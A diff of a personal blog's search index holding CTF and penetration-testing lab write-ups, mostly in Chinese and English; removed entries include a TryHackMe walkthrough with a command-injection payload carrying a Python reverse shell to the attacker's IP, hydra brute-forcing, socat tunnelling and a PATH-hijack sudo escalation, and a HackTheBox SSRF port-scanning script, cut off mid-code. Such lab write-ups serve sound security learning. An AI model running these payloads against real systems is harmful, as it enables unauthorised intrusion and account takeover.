@@ -1,61 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Year of the Fox on TryHackMe</title>
-    <url>/2024/02/23/yptf-tryhackme/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>A fun and relaxing one, my second time to solve a HARD machine on TryHackMe.  </p>
-<p>Victim’s IP : 10.10.150.100<br>Attacker’s IP : 10.9.195.189  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -Pn 10.10.150.100</span><br></pre></td></tr></table></figure>
-<p><strong>Result:</strong><br><img src="https://hackmd.io/_uploads/BJd3e6r36.png" alt="image">  </p>
-<p>well … a web service and a bunch of smb service, speaking honestly, I was shocked……(cause I’m not familiar with smb yet).  </p>
-<h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><p><code>enum4linux</code> is a tool being used to leak some informations from a vulnerable linux machine.<br><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux 10.10.150.100</span><br></pre></td></tr></table></figure>
-<p><strong>Result:</strong><br>There was sooooo many informations leaked, but I only used this XD.<br><img src="https://hackmd.io/_uploads/HkwPWTB2p.png" alt="image"><br>There are two UNIX users, fox and rescal.  </p>
-<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><h4 id="http-auth-brute-forcing"><a href="#http-auth-brute-forcing" class="headerlink" title="http auth brute forcing"></a>http auth brute forcing</h4><p>The web application on port 80 have a http auth, and I used <code>hydra</code> to brute force the password with usernames leaked by <code>enum4linux</code><br><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l rascal -P /home/kali/rockyou.txt -t 64 10.10.150.100 http-get</span><br></pre></td></tr></table></figure>
-<p><strong>Result:</strong><br><img src="https://hackmd.io/_uploads/SkTp4arhp.png" alt="image">  </p>
-<h4 id="command-injection"><a href="#command-injection" class="headerlink" title="command injection"></a>command injection</h4><p>After accessing the web application, it looked like this…….  </p>
-<p><img src="https://hackmd.io/_uploads/BJVVETB3a.png" alt="image">  </p>
-<p>It allows user to search for files, which give me an idea to use command injection attack.<br><strong>Payload:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;target&quot;</span>:<span class="string">&quot;\&quot;; python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.9.195.189\&quot;,1004));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\&quot;sh\&quot;)&#x27; ;#&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
-<p>Of course, I opened port <strong>1004</strong> to receive shell from victim.  </p>
-<h4 id="ssh-brute-forcing"><a href="#ssh-brute-forcing" class="headerlink" title="ssh brute forcing"></a>ssh brute forcing</h4><p><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
-<p><strong>Result:</strong>  </p>
-<p><img src="https://hackmd.io/_uploads/rJ-dIaBnT.png" alt="image">  </p>
-<p>well…there’s a ssh service in innet, it would be easier to brute force the user’s password from outnet.  </p>
-<p>So I wanted to download <code>socat</code> into victim’s machine from my computer so I could open another port on victim’s machine which pass through the innet <code>ssh</code> service, well…….  </p>
-<p><img src="https://hackmd.io/_uploads/H1eS_TSnT.png" alt="image"><br>Permission denied !<br>So I searched for folder with a writable permission…<br><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">ls</span> -al</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rkH3_6Hna.png" alt="image"><br>P.S. Don’t forget to change permission for it~  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x socat</span><br></pre></td></tr></table></figure>
-<p>The <code>tmp</code> folder can be used !<br>Now, is time to open ssh service to outnet with socat!<br><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./socat tcp-listen:5427,reuseaddr,fork tcp:localhost:22</span><br></pre></td></tr></table></figure>
-<p>Finally, here brute forcing is~<br><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l fox -P /home/kali/rockyou.txt -t 64 ssh://10.10.150.100 -s 5427</span><br></pre></td></tr></table></figure>
-<p><strong>Result:</strong><br><img src="https://hackmd.io/_uploads/BkdAtTHhp.png" alt="image">  </p>
-<p>Now log in with the informations~  </p>
-<p><img src="https://hackmd.io/_uploads/B1f42prna.png" alt="image">  </p>
-<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><h4 id="poweroff-escalation"><a href="#poweroff-escalation" class="headerlink" title="poweroff escalation"></a>poweroff escalation</h4><p>First of all, check my permission with <code>sudo -l</code>:  </p>
-<p><img src="https://hackmd.io/_uploads/SyxE5arnT.png" alt="image">  </p>
-<p>I setup a http server from it to find out how <code>/usr/bin/shutdown</code> work……<br><strong>Reverse Engineering with ghidra:</strong><br><img src="https://hackmd.io/_uploads/r1KJjTSn6.png" alt="image"><br>…….<br>well, well, well…<br>After that, I searched for the poweroff command on GTFOBins<br><img src="https://hackmd.io/_uploads/HynGjTSnp.png" alt="image"><br>Nothing found.<br><strong>WHAT?!!</strong><br>And finally, I found out this:<br><a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/">https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/</a><br><strong>Command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt; /tmp/poweroff</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/poweroff</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">sudo /usr/sbin/shutdown</span><br></pre></td></tr></table></figure>
-<p>And finally… get root!!!<br>But what?<br><img src="https://hackmd.io/_uploads/BJFl2pB2T.png" alt="image"><br>Kinda tricky(<br>Just a simple hide&amp;see though…  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / | grep root</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rJ7YnTH36.png" alt="image"><br>Aha!<br><img src="https://hackmd.io/_uploads/ryUl66r3T.png" alt="image"><br>So…<br>who can tell me the meaning of:  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw</span><br><span class="line">Mwo=</span><br></pre></td></tr></table></figure>
-<p>:&gt;<br>🦈🐋🦈🐋</p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>Now stucked on Year of the Dog :&lt;  </p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-        <tag>Command Injection</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023 年末回顧</title>
     <url>/2023/12/31/2023FINAL/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這是從我fb轉貼的，之後有空會重新寫(  </p>
@@ -257,7 +202,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#x65;&#114;&#114;&#x65;&#110;&#99;&#101;&#x64;&#x65;&#115;&#99;&#x61;&#x72;&#x74;&#101;&#x73;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;">&#x74;&#x65;&#114;&#114;&#x65;&#110;&#99;&#101;&#x64;&#x65;&#115;&#99;&#x61;&#x72;&#x74;&#101;&#x73;&#x40;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#116;&#101;&#114;&#114;&#x65;&#x6e;&#99;&#101;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#116;&#101;&#x73;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#46;&#99;&#x6f;&#109;">&#116;&#101;&#114;&#114;&#x65;&#x6e;&#99;&#101;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#116;&#101;&#x73;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#46;&#99;&#x6f;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -265,7 +210,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#101;&#x72;&#114;&#101;&#110;&#x63;&#101;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#x74;&#x65;&#x73;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#x74;&#101;&#x72;&#114;&#101;&#110;&#x63;&#101;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#x74;&#x65;&#x73;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#101;&#114;&#x72;&#101;&#110;&#x63;&#x65;&#x64;&#101;&#115;&#x63;&#97;&#x72;&#116;&#x65;&#115;&#64;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;">&#x74;&#101;&#114;&#x72;&#101;&#110;&#x63;&#x65;&#x64;&#101;&#115;&#x63;&#97;&#x72;&#116;&#x65;&#115;&#64;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#x6d;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -488,11 +433,11 @@
 <p>駭客ㄉ浪漫啊~<br>晚ㄢ :&gt;  </p>
 ]]></content>
       <tags>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
         <tag>AD</tag>
         <tag>Active Directory</tag>
         <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
       </tags>
   </entry>
   <entry>
@@ -547,10 +492,10 @@
 ]]></content>
       <tags>
         <tag>CTF</tag>
-        <tag>Command Injection</tag>
         <tag>Web Security</tag>
         <tag>Cryptography</tag>
         <tag>ECC</tag>
+        <tag>Command Injection</tag>
         <tag>CTR</tag>
         <tag>CFB</tag>
         <tag>OFB</tag>
@@ -941,9 +886,9 @@
 ]]></content>
       <tags>
         <tag>CTF</tag>
+        <tag>Windows</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
-        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -1247,9 +1192,9 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <p><strong>References</strong><br><a href="https://juggernaut-sec.com/alwaysinstallelevated/">https://juggernaut-sec.com/alwaysinstallelevated/</a>  </p>
 ]]></content>
       <tags>
+        <tag>Windows</tag>
         <tag>Pentesting</tag>
         <tag>TryHackMe</tag>
-        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -1445,34 +1390,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>Editorial Write Up on HackTheBox</title>
-    <url>/2024/06/16/editorial-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>很水的一台(?)<br>但寫腳本開心owo，有練習到常用招<br>Attacker’s IP : 10.10.14.58<br>Victim’s IP : 10.10.11.20<br>Victim’s Host : editorial.htb  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.20 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/B1LvTX3rC.png" alt="image"></p>
-<p>很正常地開了 port 22的ssh和port 80的web服務<br>後面也有做路徑爆破，但沒什麼突破口</p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>進去<code>http://editorial.htb/upload</code>的url會看到book informatino的頁面，可以讓你傳圖片url他去抓下來  </p>
-<p><img src="https://hackmd.io/_uploads/BJW6w4nrC.png" alt="image">  </p>
-<p>封包post出去的內容：  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------36038148391578841867765834101</span><br><span class="line">Content-Disposition: form-data; name=&quot;bookurl&quot;</span><br><span class="line"></span><br><span class="line">http://10.10.14.58:9999/NoGameNoLife.png</span><br><span class="line">-----------------------------36038148391578841867765834101</span><br><span class="line">Content-Disposition: form-data; name=&quot;bookfile&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------36038148391578841867765834101--</span><br></pre></td></tr></table></figure>
-<p>嘗試 SSRF掃端口(如果無法抓到那會回傳<code>expected_response</code>那張image)<br><strong>enum-port.py</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange, tqdm</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://editorial.htb/upload-cover&quot;</span></span><br><span class="line">boundary = <span class="string">&quot;14276312323520530593225841561&quot;</span></span><br><span class="line">expected_response = <span class="string">&#x27;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_request</span>(<span class="params">i</span>):</span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;bookurl&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;http://127.0.0.1:<span class="subst">&#123;i&#125;</span>/\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;bookfile&quot;; filename=&quot;&quot;\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Type: application/octet-stream\r\n\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>--\r\n&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">f&#x27;multipart/form-data; boundary=<span class="subst">&#123;boundary&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        web = req.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> web.text != expected_response:</span><br><span class="line">            <span class="built_in">print</span>(web.text, <span class="string">f&#x27;port : <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> req.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Request failed for port <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="built_in">list</span>(tqdm(executor.<span class="built_in">map</span>(make_request, <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">65536</span>)), total=<span class="number">65535</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p><strong>Result:</strong><br><img src="https://hackmd.io/_uploads/SkVz94nrC.png" alt="image">  </p>
-<p>dump出這坨東西：  </p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;messages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;promotions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve a list of all the promotions in our library.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/messages/promos&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;coupons&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve the list of coupons to use in our library.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/messages/coupons&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;new_authors&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve the welcome message sended to our new authors.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/messages/authors&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;platform_use&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve examples of how to use the platform.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/messages/how_to_use_platform&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;changelog&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve a list of all the versions and updates of the api.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata/changelog&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;latest&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Retrieve the last version of api.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/api/latest/metadata&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;methods&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-<p>其中<code>/api/latest/metadata/messages/authors</code>的path就可以拿到 ssh的帳密了  </p>
-<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="bash-suid"><a href="#bash-suid" class="headerlink" title="bash suid???"></a>bash suid???</h4><p><img src="https://hackmd.io/_uploads/Skfch4hBC.png" alt="image">  </p>
-<p><code>bash -p</code>結束這回合…</p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>水，撫慰今天apcs 觀念題繼續被炸爛的心情<br>要段考要資格考ㄌqwq<br>這個賽季應該只能 Silver了ㄅ，下季要努力打(如果沒有衝到其他事情)<br><img src="https://hackmd.io/_uploads/SyFVCNhHC.png" alt="image">  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>SSRF</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Enterprise on Tryhackme</title>
     <url>/2024/03/16/enterprise-thm/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>好欸現在在當科班志工owo<br>Victim’s IP : 10.10.3.132<br>Victim’s Host : lab.enterprise.thm<br>Attacker’s IP : 10.9.195.189  </p>
@@ -1517,11 +1434,11 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
 <h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>neko???  </p>
 ]]></content>
       <tags>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
         <tag>AD</tag>
         <tag>Active Directory</tag>
         <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
       </tags>
   </entry>
   <entry>
@@ -1559,6 +1476,34 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Windows</tag>
         <tag>Flare-On</tag>
         <tag>reverse engineering</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Editorial Write Up on HackTheBox</title>
+    <url>/2024/06/16/editorial-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>很水的一台(?)<br>但寫腳本開心owo，有練習到常用招<br>Attacker’s IP : 10.10.14.58<br>Victim’s IP : 10.10.11.20<br>Victim’s Host : editorial.htb  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.20 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/B1LvTX3rC.png" alt="image"></p>
+<p>很正常地開了 port 22的ssh和port 80的web服務<br>後面也有做路徑爆破，但沒什麼突破口</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>進去<code>http://editorial.htb/upload</code>的url會看到book informatino的頁面，可以讓你傳圖片url他去抓下來  </p>
+<p><img src="https://hackmd.io/_uploads/BJW6w4nrC.png" alt="image">  </p>
+<p>封包post出去的內容：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------36038148391578841867765834101</span><br><span class="line">Content-Disposition: form-data; name=&quot;bookurl&quot;</span><br><span class="line"></span><br><span class="line">http://10.10.14.58:9999/NoGameNoLife.png</span><br><span class="line">-----------------------------36038148391578841867765834101</span><br><span class="line">Content-Disposition: form-data; name=&quot;bookfile&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------36038148391578841867765834101--</span><br></pre></td></tr></table></figure>
+<p>嘗試 SSRF掃端口(如果無法抓到那會回傳<code>expected_response</code>那張image)<br><strong>enum-port.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange, tqdm</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://editorial.htb/upload-cover&quot;</span></span><br><span class="line">boundary = <span class="string">&quot;14276312323520530593225841561&quot;</span></span><br><span class="line">expected_response = <span class="string">&#x27;/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_request</span>(<span class="params">i</span>):</span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">f&#x27;--<span class="subst">&#123;boundary&#125;</span>\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: 